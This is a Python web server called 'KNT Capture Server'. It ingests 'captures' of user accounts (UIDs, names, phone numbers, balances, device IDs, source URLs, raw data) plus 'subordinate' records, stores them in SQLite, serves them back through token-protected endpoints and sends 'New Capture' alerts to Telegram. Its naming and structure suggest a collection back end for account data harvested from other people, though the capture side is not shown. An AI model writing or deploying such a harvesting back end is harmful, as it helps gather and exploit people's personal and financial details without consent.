#!/usr/bin/env python3
"""
KNT Capture Server -- captures + subordinates + UID check
"""

import os
import sqlite3
import time
import asyncio

from aiohttp import web

# ---- CONFIG -----------------------------------------------------------------

INGEST_TOKEN = "knt-capture-CHANGE-THIS-9f2b7c3d4e"
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
DB = "captures.db"
MAX_PER_REQUEST = 500


# ---- DB ---------------------------------------------------------------------

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.executescript("""
    CREATE TABLE IF NOT EXISTS captures (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id    TEXT,
        uid          TEXT,
        user_name    TEXT,
        nick_name    TEXT,
        phone        TEXT,
        balance      TEXT,
        amount_code  TEXT,
        host         TEXT,
        source_url   TEXT,
        raw          TEXT,
        captured_at  INTEGER,
        received_at  TEXT DEFAULT CURRENT_TIMESTAMP,
        UNIQUE(device_id, uid)
    );
    CREATE INDEX IF NOT EXISTS idx_uid ON captures(uid);
    CREATE INDEX IF NOT EXISTS idx_device ON captures(device_id);

    CREATE TABLE IF NOT EXISTS subordinates (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        owner_uid    TEXT,
        uid          TEXT UNIQUE,
        user_name    TEXT,
        phone        TEXT,
        balance      TEXT,
        raw          TEXT,
        captured_at  TEXT DEFAULT CURRENT_TIMESTAMP
    );
    CREATE INDEX IF NOT EXISTS idx_sub_uid ON subordinates(uid);

    CREATE TABLE IF NOT EXISTS bot_users (
        telegram_id  INTEGER PRIMARY KEY,
        uid          TEXT,
        first_seen   TEXT DEFAULT CURRENT_TIMESTAMP,
        last_check   TEXT
    );
    """)
    conn.commit()
    conn.close()


def save_capture(item):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    try:
        c.execute("""
        INSERT OR IGNORE INTO captures
        (device_id, uid, user_name, nick_name, phone, balance,
         amount_code, host, source_url, raw, captured_at)
        VALUES (?,?,?,?,?,?,?,?,?,?,?)
        """, (
            item.get("device_id", ""),
            item.get("uid", ""),
            item.get("userName", ""),
            item.get("nickName", ""),
            item.get("phone", ""),
            item.get("balance", ""),
            item.get("amountOfCode", ""),
            item.get("host", ""),
            item.get("sourceUrl", ""),
            item.get("raw", ""),
            item.get("updatedAt", int(time.time() * 1000)),
        ))
        conn.commit()
        return c.rowcount > 0
    except Exception:
        return False
    finally:
        conn.close()


def save_subordinate(owner_uid, sub):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    try:
        c.execute("""
        INSERT OR REPLACE INTO subordinates
        (owner_uid, uid, user_name, phone, balance, raw)
        VALUES (?,?,?,?,?,?)
        """, (
            owner_uid,
            sub.get("uid", ""),
            sub.get("userName", ""),
            sub.get("phone", ""),
            sub.get("balance", ""),
            sub.get("raw", ""),
        ))
        conn.commit()
        return True
    except Exception:
        return False
    finally:
        conn.close()


def get_cross_report():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    cap_uids = {r["uid"] for r in conn.execute(
        "SELECT DISTINCT uid FROM captures").fetchall() if r["uid"]}
    sub_uids = {r["uid"] for r in conn.execute(
        "SELECT uid FROM subordinates").fetchall() if r["uid"]}
    conn.close()
    return {
        "confirmed": sorted(cap_uids & sub_uids),
        "unknown": sorted(cap_uids - sub_uids),
        "only_subordinate": sorted(sub_uids - cap_uids),
    }


# ---- TELEGRAM ---------------------------------------------------------------

async def notify(text: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        import aiohttp
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        async with aiohttp.ClientSession() as s:
            await s.post(url, json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            }, timeout=aiohttp.ClientTimeout(total=8))
    except Exception:
        pass


# ---- ROUTES -----------------------------------------------------------------

async def handle_root(req):
    return web.Response(text="KNT Capture Server is running.")


async def handle_health(req):
    conn = sqlite3.connect(DB)
    n_cap = conn.execute("SELECT COUNT(*) FROM captures").fetchone()[0]
    n_sub = conn.execute("SELECT COUNT(*) FROM subordinates").fetchone()[0]
    n_bot = conn.execute("SELECT COUNT(*) FROM bot_users").fetchone()[0]
    conn.close()
    return web.json_response({
        "ok": True,
        "captures": n_cap,
        "subordinates": n_sub,
        "bot_users": n_bot,
    })


async def handle_ingest(req):
    if req.headers.get("X-Ingest-Token", "") != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    try:
        data = await req.json()
    except Exception:
        return web.json_response({"ok": False, "err": "bad json"}, status=400)

    items = []
    if isinstance(data, list):
        items = data
    elif isinstance(data, dict):
        items = data.get("items") or data.get("captures") or []
    items = items[:MAX_PER_REQUEST]

    saved = 0
    for it in items:
        if not isinstance(it, dict):
            continue
        if save_capture(it):
            saved += 1
            uid = it.get("uid", "?")
            uname = it.get("userName", "?")
            bal = it.get("balance", "?")
            dev = it.get("device_id", "?")
            asyncio.create_task(notify(
                f"🎯 <b>New Capture</b>\n\n"
                f"🆔 UID: <code>{uid}</code>\n"
                f"👤 {uname}\n💎 {bal}\n📱 <code>{dev}</code>"
            ))
    return web.json_response({"ok": True, "received": len(items), "saved": saved})


async def handle_subs_ingest(req):
    if req.headers.get("X-Ingest-Token", "") != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    try:
        data = await req.json()
    except Exception:
        return web.json_response({"ok": False, "err": "bad json"}, status=400)

    owner = data.get("owner_uid", "")
    items = data.get("items") or data.get("subordinates") or []
    items = items[:MAX_PER_REQUEST]

    saved = 0
    for it in items:
        if not isinstance(it, dict):
            continue
        if not it.get("uid"):
            continue
        if save_subordinate(owner, it):
            saved += 1

    rep = get_cross_report()
    asyncio.create_task(notify(
        f"📡 <b>Subordinate Sync</b>\n\n"
        f"👤 owner: <code>{owner}</code>\n"
        f"📥 received: {len(items)}\n"
        f"✔ saved: {saved}\n\n"
        f"✅ confirmed: <b>{len(rep['confirmed'])}</b>\n"
        f"❓ unknown: <b>{len(rep['unknown'])}</b>"
    ))

    return web.json_response({
        "ok": True,
        "received": len(items),
        "saved": saved,
        "confirmed": rep["confirmed"],
        "unknown": rep["unknown"],
    })


async def handle_check_uid(req):
    """Check if a UID belongs to our team."""
    token = (req.headers.get("X-Ingest-Token", "")
             or req.query.get("token", ""))
    if token != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    uid = (req.query.get("uid") or "").strip()
    if not uid:
        return web.json_response({"ok": False, "err": "no uid"}, status=400)

    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row

    sub = conn.execute(
        "SELECT * FROM subordinates WHERE uid=?", (uid,)
    ).fetchone()

    cap = conn.execute(
        "SELECT * FROM captures WHERE uid=? ORDER BY id DESC LIMIT 1", (uid,)
    ).fetchone()

    if not sub:
        conn.close()
        return web.json_response({
            "ok": True,
            "found": False,
            "uid": uid,
        })

    sub_d = dict(sub)
    cap_d = dict(cap) if cap else {}

    conn.close()
    return web.json_response({
        "ok": True,
        "found": True,
        "uid": uid,
        "userName": sub_d.get("user_name", "") or cap_d.get("user_name", ""),
        "phone": sub_d.get("phone", "") or cap_d.get("phone", ""),
        "balance": sub_d.get("balance", "") or cap_d.get("balance", ""),
        "owner": sub_d.get("owner_uid", ""),
        "joined": sub_d.get("captured_at", ""),
    })


async def handle_report(req):
    if req.query.get("token", "") != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    rep = get_cross_report()
    return web.json_response({"ok": True, **rep})


async def handle_list(req):
    if req.query.get("token", "") != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    limit = int(req.query.get("limit", 200))
    rows = conn.execute(
        "SELECT * FROM captures ORDER BY id DESC LIMIT ?", (limit,)
    ).fetchall()
    conn.close()
    return web.json_response({
        "ok": True,
        "count": len(rows),
        "items": [dict(r) for r in rows],
    })


async def handle_subs_list(req):
    if req.query.get("token", "") != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    limit = int(req.query.get("limit", 200))
    rows = conn.execute(
        "SELECT * FROM subordinates ORDER BY id DESC LIMIT ?", (limit,)
    ).fetchall()
    conn.close()
    return web.json_response({
        "ok": True,
        "count": len(rows),
        "items": [dict(r) for r in rows],
    })


def make_app():
    app = web.Application()
    app.router.add_get("/", handle_root)
    app.router.add_get("/health", handle_health)
    app.router.add_post("/api/public/captures-ingest", handle_ingest)
    app.router.add_post("/api/public/subordinates-ingest", handle_subs_ingest)
    app.router.add_get("/api/public/check-uid", handle_check_uid)
    app.router.add_get("/api/public/report", handle_report)
    app.router.add_get("/api/public/captures-list", handle_list)
    app.router.add_get("/api/public/subordinates-list", handle_subs_list)
    return app


if __name__ == "__main__":
    init_db()
    port = int(os.environ.get("PORT", 8080))
    print(f"[knt] server on :{port}")
    web.run_app(make_app(), host="0.0.0.0", port=port)
